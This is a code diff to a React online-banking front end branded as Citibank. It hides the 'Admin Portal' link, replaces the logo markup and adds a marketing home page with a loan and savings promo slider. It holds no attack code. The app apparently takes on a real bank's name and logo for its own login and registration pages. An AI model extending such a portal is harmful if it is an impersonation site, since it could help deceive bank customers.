@@ -142,24 +142,7 @@ function LanguageSwitcher() {
 function Brand({ admin = false }) {
   return (
     <a className="brand" href={admin ? "/admin/dashboard" : "/dashboard"}>
-      <svg className="brand-logo" width="89" height="89" viewBox="0 0 89 89" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-        <g clipPath="url(#clip0_383_492)">
-          <path d="M16.5485 50.2744C16.5485 44.5 21.2765 40.0045 27.4384 40.0045C31.0038 40.0045 34.2592 41.5934 36.1194 43.9962L33.4453 46.6702C32.7361 45.7621 31.8311 45.0257 30.7978 44.5157C29.7645 44.0058 28.6294 43.7355 27.4772 43.7249C23.7955 43.7249 20.8502 46.4765 20.8502 50.2744C20.8502 54.1111 23.7955 56.8626 27.4772 56.8626C28.6707 56.8612 29.8477 56.5841 30.9165 56.0531C31.9853 55.522 32.9171 54.7513 33.6391 53.801L36.2744 56.3976C34.4917 58.9166 31.0813 60.583 27.4384 60.583C21.2765 60.583 16.5485 56.0875 16.5485 50.2744Z" fill="#255BE3"/>
-          <path d="M39.7623 40.7021H43.9865V59.8855H39.7623V40.7021Z" fill="#255BE3"/>
-          <path d="M51.8537 54.7311V44.2675H47.2419V40.7021H52.0474V36.5941L56.0004 34.6564V40.7021H62.2786V44.2675H56.0004V54.0336C56.0004 55.9713 57.0855 56.8239 59.1395 56.8239C60.2082 56.8294 61.2656 56.6047 62.2398 56.165V59.808C61.0192 60.3435 59.697 60.608 58.3644 60.583C54.6052 60.583 51.8537 58.5291 51.8537 54.7311Z" fill="#255BE3"/>
-          <path d="M65.6115 40.7021H69.8357V59.8855H65.6115V40.7021Z" fill="#255BE3"/>
-          <path d="M54.7602 28.4945C58.2295 28.4862 61.6499 29.3129 64.7324 30.9047C67.815 32.4966 70.4692 34.8069 72.471 37.6405H67.5492C65.9359 35.8474 63.9637 34.4136 61.7605 33.4321C59.5572 32.4506 57.1722 31.9434 54.7602 31.9434C52.3483 31.9434 49.9632 32.4506 47.76 33.4321C45.5567 34.4136 43.5845 35.8474 41.9713 37.6405H37.0495C39.0512 34.8069 41.7055 32.4966 44.788 30.9047C47.8706 29.3129 51.2909 28.4862 54.7602 28.4945Z" fill="#FF3C28"/>
-        </g>
-        <defs>
-          <clipPath id="clip0_383_492">
-            <rect width="56" height="32.3599" fill="white" transform="translate(16.5 28.3201)"/>
-          </clipPath>
-        </defs>
-      </svg>
-      <span className="brand-name">
-        <b>citi</b>
-        <small>Citibank, N.A.</small>
-      </span>
+      <img className="brand-logo" src="/citibank-logo.svg" alt="Citibank" />
     </a>
   );
 }
@@ -342,11 +325,6 @@ function Login({ admin = false }) {
         {!admin && (
           <a className="portal-link register-link" href="/register">
             {t("Register for online banking")} <ChevronRight size={15} />
-          </a>
-        )}
-        {!admin && (
-          <a className="portal-link" href="/admin/login">
-            {t("Admin Portal")} <ChevronRight size={15} />
           </a>
         )}
       </div>
@@ -1476,6 +1454,96 @@ function AdminManagement({ user }) {
     </Shell>
   );
 }
+function BankPromoSlider() {
+  const [index, setIndex] = React.useState(0);
+  const slides = [
+    { title: "Need Extra Cash?", text: "Apply for an instant loan with low interest rates.", color: "#255BE3" },
+    { title: "Upgrade to Platinum Card", text: "Enjoy higher limits and exclusive rewards.", color: "#1A3FA0" },
+    { title: "Grow Your Savings", text: "Earn up to 4.5% APY on high-yield accounts.", color: "#255BE3" },
+    { title: "Secure Banking", text: "Advanced encryption keeps your money safe.", color: "#1A3FA0" },
+  ];
+  React.useEffect(() => {
+    const timer = setInterval(() => setIndex((prev) => (prev + 1) % slides.length), 4000);
+    return () => clearInterval(timer);
+  }, []);
+  return (
+    <div className="promo-slider">
+      <div className="promo-track" style={{ transform: `translateX(-${index * 100}%)` }}>
+        {slides.map((s, i) => (
+          <div key={i} className="promo-slide" style={{ background: s.color }}>
+            <div className="promo-text">
+              <h3>{s.title}</h3>
+              <p>{s.text}</p>
+              <button className="promo-btn">Learn More</button>
+            </div>
+            <div className="promo-logo-wrap">
+              <img src="/citi-logo.png" alt="Citibank" className="promo-logo" />
+            </div>
+          </div>
+        ))}
+      </div>
+      <div className="promo-dots">
+        {slides.map((_, i) => (
+          <span key={i} className={i === index ? "active" : ""} />
+        ))}
+      </div>
+    </div>
+  );
+}
+function Home() {
+  return (
+    <div className="home-page">
+      <header className="home-header">
+        <div className="home-header-inner">
+          <img src="/citibank-logo.svg" alt="Citibank" className="home-logo" />
+          <div className="home-header-links">
+            <a href="/login" className="home-login-btn">Sign In</a>
+          </div>
+        </div>
+      </header>
+      <section className="home-hero">
+        <div className="home-hero-inner">
+          <div className="home-hero-text">
+            <h1>Transfer Money Across The World In Real Time</h1>
+            <p>Simple, fast and secure transfers — made for individuals and businesses.</p>
+            <div className="home-hero-buttons">
+              <a href="/login" className="primary-button">Online Access</a>
+              <a href="/register" className="secondary-button">Open Account</a>
+            </div>
+          </div>
+          <div className="home-hero-image">
+            <img src="/citibank-logo.svg" alt="Citibank" />
+          </div>
+        </div>
+      </section>
+      <div className="home-slider-section">
+        <BankPromoSlider />
+      </div>
+      <section className="home-features">
+        <div className="home-features-inner">
+          <div className="home-feature">
+            <div className="home-feature-icon">🔒</div>
+            <h3>Secure Banking</h3>
+            <p>Advanced encryption keeps your money safe 24/7.</p>
+          </div>
+          <div className="home-feature">
+            <div className="home-feature-icon">⚡</div>
+            <h3>Instant Transfers</h3>
+            <p>Send money in real time to anyone, anywhere.</p>
+          </div>
+          <div className="home-feature">
+            <div className="home-feature-icon">💳</div>
+            <h3>Global Access</h3>
+            <p>Manage your accounts from anywhere in the world.</p>
+          </div>
+        </div>
+      </section>
+      <footer className="home-footer">
+        <p>&copy; 2026 Citibank, N.A. All rights reserved.</p>
+      </footer>
+    </div>
+  );
+}
 function App() {
   const [auth, setAuth] = useState(null);
   const path = window.location.pathname;
@@ -1504,7 +1572,7 @@ function App() {
   if (path === "/register") return <Register />;
   if (path === "/forgot-access-code") return <ForgotAccessCode />;
   if (path === "/login") return <Login />;
-  if (path === "/" || path === "") return <Login />;
+  if (path === "/" || path === "") return <Home />;
   if (auth === null)
     return <div className="loading-page">Loading Citibank...</div>;
   if (!auth) {
